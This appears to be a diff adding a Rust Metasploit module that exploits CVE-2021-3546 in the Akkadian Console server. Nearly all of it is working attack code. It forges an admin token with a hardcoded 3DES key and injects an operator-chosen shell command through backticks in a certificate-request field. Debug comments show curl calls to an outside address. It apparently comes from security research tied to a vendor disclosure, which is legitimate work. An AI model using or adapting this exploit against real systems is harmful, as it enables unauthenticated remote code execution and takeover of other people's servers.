@@ -1,0 +1,270 @@
+//! This is a regular crate doc comment, but it also contains a partial
+//! Cargo manifest.  Note the use of a *fenced* code block, and the
+//! `cargo` "language".
+//!
+//! ```cargo
+//! [dependencies]
+//! libc = "*"
+//! base64 = "*"
+//! metasploit-shim = "0.1.4"
+//! isahc="*"
+//! chrono = "*"
+// //! serde_json = "*"
+//! ```
+
+#![allow(non_camel_case_types, non_upper_case_globals, non_snake_case)]
+
+extern crate libc;
+extern crate metasploit_shim;
+extern crate isahc;
+extern crate base64;
+extern crate chrono;
+
+use libc::c_uchar;
+use std::error::Error;
+use std::collections::HashMap;
+use metasploit_shim::*;
+use chrono::{DateTime, Utc}; // 0.4.15
+use std::time::Duration;
+use std::time::SystemTime;
+use isahc::prelude::*;
+use isahc::config::SslOption;
+
+pub type DES_cblock = [c_uchar; 8];
+pub type const_DES_cblock = [c_uchar; 8];
+pub type DES_LONG = libc::c_ulong;
+pub const Encrypt: i32 = 1;
+pub const Decrypt: i32 = 0;
+
+#[repr(C)]
+#[derive(Default, Debug)]
+pub struct DES_key_schedule {
+    ks: [DES_cblock; 16],
+}
+
+// crypto.so ffi
+#[link(name = "crypto")]
+extern {
+    fn DES_set_key_unchecked(block_key: *const c_uchar, ks: *mut DES_key_schedule);
+    fn DES_ecb3_encrypt(input: *const c_uchar, output: *mut c_uchar,
+                            ks1: *const DES_key_schedule,
+                            ks2: *const DES_key_schedule,
+                            ks3: *const DES_key_schedule,
+                            enc: libc::c_int,
+    );
+}
+
+
+
+fn main() -> Result<(),Box<dyn Error>> {
+
+    let mut module_options: HashMap<String,ModuleOption> = HashMap::new();
+
+    module_options.insert(
+        "CMD".to_string(), ModuleOption{ 
+            Type: "string".to_string(),
+            description: "command to execute".to_string(),
+            required: true,
+            default: "hostname".to_string(),
+        });
+    module_options.insert(
+        "RPORT".to_string(), ModuleOption{ 
+            Type: "string".to_string(),
+            description: "remote port".to_string(),
+            required: true,
+            default: "443".to_string(),
+        }
+        );
+    module_options.insert(
+        "USE_SSL".to_string(), ModuleOption{ 
+            Type: "string".to_string(),
+            description: "use https:// as schema".to_string(),
+            required: true,
+            default: "true".to_string(),
+        }
+        );
+   module_options.insert(
+       "RHOSTS".to_string(), ModuleOption{ 
+           Type: "string".to_string(),
+           description: "remote host".to_string(),
+           required: true,
+           default: "".to_string(),
+        }
+        );
+   //  module_options.insert(
+   //      "RHOST".to_string(), ModuleOption{ 
+   //          Type: "string".to_string(),
+   //          description: "remote host".to_string(),
+   //          required: true,
+   //          default: "".to_string(),
+   //      }
+   //      );
+    let mut metadata = Metadata::default();
+    metadata.license="MSF_LICENSE".to_string();
+    metadata.name = "akkadian_aco_rce".to_string();
+    metadata.payload = Payload { 
+        command_stager_flavor: "curl".to_string() 
+        };
+    metadata.wfsdelay = 5;
+    metadata.targets = vec![
+        Target { platform: "linux".to_string(),arch:"x86".to_string(),}
+        ];
+    metadata.description = "test description".to_string();
+    metadata.rank = "excellent".to_string();
+    metadata.authors= vec!["deadjakk".to_string()];
+    metadata.references =  vec![
+            Reference {
+                Type: "URL".to_string(), 
+                Ref: "https://www.rapid7.com/blog/post/2021/09/07/\
+                    cve-2021-3546-78-akkadian-console-server-vulner\
+                    abilities-fixed/".to_string()
+            }
+        ];
+    metadata.date= "2021-09-15".to_string();
+    metadata.Type= "remote_exploit".to_string();
+    metadata.privileged= false;
+    metadata.options= module_options;
+
+    // here for debugging/testing
+    //  extern crate serde_json;
+    //  use serde_json::json;
+
+    //  let params = MsfParamWrapper::new(
+    //      json!({"RPORT":"9990","CMD":"curl 192.168.1.250:3232","RHOST":"127.0.0.1",
+    //          "USE_SSL":"TRUE"})
+    //      );
+    //  run_module(&params);
+    //  return Ok(());
+
+    init(metadata,run_module,None)?;
+
+    Ok(())
+}
+
+fn run_module(
+    params: &MsfParamWrapper
+) -> Result<Option<String>,Box<dyn Error>> {
+// println!("running");
+    //log_info("test-info");
+    //log_debug("test-debug");
+    //log_good("test-good");
+    //log_warning("test-warning");
+    //log_error("test-error");
+
+    // let mut data: HashMap<String,String> = HashMap::new();
+    // data.insert("username".to_string(),"admin1444".to_string());
+    // report_credential_login("1.1.1.1","1080","tcp","socks5",Some(data));
+
+    // report_correct_password("admin1","password1",None);
+    // log_good(&format!("rhost argument: {}",rhost_arg));
+
+     // eprintln!("what I am getting !! -> {:?}",params);
+    let mut schema = "http";
+    let use_ssl = params
+        .get_arg("USE_SSL")
+        .expect("use_ssl")
+        .to_lowercase()
+        .parse::<bool>()
+        .expect("unable to parse use_ssl");
+    let rhosts = params
+        .get_arg("RHOSTS")
+        .expect("rhost couldn't be retrieved");
+    let cmd = params
+        .get_arg("CMD")
+        .expect("cmd couldn't be retrieved");
+    let rport = params
+        .get_arg("RPORT")
+        .expect("rport couldn't be retrieved")
+        .parse::<u16>()
+        .expect("unable to parse port from rport string");
+    // let cmd = "curl 192.168.200.1:3232"; // TODO remove this line
+
+
+
+    // craft a token
+    let time: DateTime<Utc> = SystemTime::now().into();
+    let timenow = time.to_rfc3339();
+    let token_str = format!(r#"<?xml version="1.0" encoding="utf-16"?>
+<Token xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <l>admin</l>
+  <un>admin</un>
+  <u>change this</u>
+  <t>{}</t>
+  <TenantId>5bad271b0ec4bd068b843bf2</TenantId>
+</Token>"#,timenow); // ---------------------------------------
+    let encrypted = des_ecb3(&token_str.as_bytes(), Encrypt);
+    let encoded_crypt = base64::encode(&encrypted);
+ 
+    // perform GET request for the application using crafted token
+    // println!("KRYPT->{}",encoded_crypt);
+    if use_ssl{
+        schema = "https";
+    }
+
+    let url = format!("{}://{}:{}/api/acoweb/generateCertificate",schema,rhosts,rport);
+    let req = isahc::Request::post(url)
+        .ssl_options(SslOption::DANGER_ACCEPT_INVALID_CERTS | 
+             SslOption::DANGER_ACCEPT_REVOKED_CERTS | 
+             SslOption::DANGER_ACCEPT_INVALID_HOSTS)
+        .header("Authorization",encoded_crypt)
+        .header("Content-Type","application/json")
+        .timeout(Duration::from_secs(5))
+        .body(
+            format!(r#"{{'CommonName': 'testing.com', 'Country': 'US', 'State': ';;;;;', 'City': ';;;;', 'Organization': ';;;;;', 'OrganizationUnit': ';;;;`{}`;;;;', 'Email': 'jpeterson@rapid7.com', 'AlternativeNames': [';;;;;', ';;;']}}"#,cmd)
+                );
+    log_info(&format!("sending request to {}",rhosts));
+    match req?.send(){ 
+        Ok(r) => {
+            if r.status() == 200 {
+                log_good("http status 200 returned, that's a good sign");
+            }
+        }
+        Err(e) => {
+            log_error(&format!(
+            "error received while trying to send: {}",e.to_string()));
+        }
+    }
+
+    Ok(None)
+}
+
+pub fn des_ecb3(data: &[u8], mode:i32) -> Vec<u8> {
+    // 0c8584b9-020b-4db4-9247-22dd329d53d7 -> md5sum -> decimal
+    let key = [135,73,158,65,167,169,69,244,39,231,134,158,28,105,183,187,135,
+        73,158,65,167,169,69,244];
+
+    // pad data
+    let mut data = data.to_vec();
+    let mut pad = 8 - data.len() % 8;
+    if pad == 8 {
+        pad = 0;
+    }
+    for _ in 0..pad {
+        data.push(pad as u8);
+    }
+
+    let mut ks = Vec::new();
+    for _ in 0..3 {
+        ks.push(DES_key_schedule::default());
+    }
+    let mut out_block = vec![0u8; 8];
+    let mut output = Box::new(Vec::with_capacity(data.len()));
+    unsafe {
+        for (i, item) in key.chunks(8).enumerate() {
+            DES_set_key_unchecked(item.as_ptr(), &mut ks[i]);
+        }
+
+        for i in data.chunks(8) {
+            DES_ecb3_encrypt(i.as_ptr(), out_block.as_mut_ptr(), &ks[0], &ks[1], &ks[2], mode);
+            output.extend_from_slice(out_block.as_slice());
+        }
+    }
+    if mode == Decrypt {
+        let pad = *output.last().unwrap();
+        (*output).truncate(data.len() - pad as usize);
+        *output
+    } else {
+        *output
+    }
+}
+
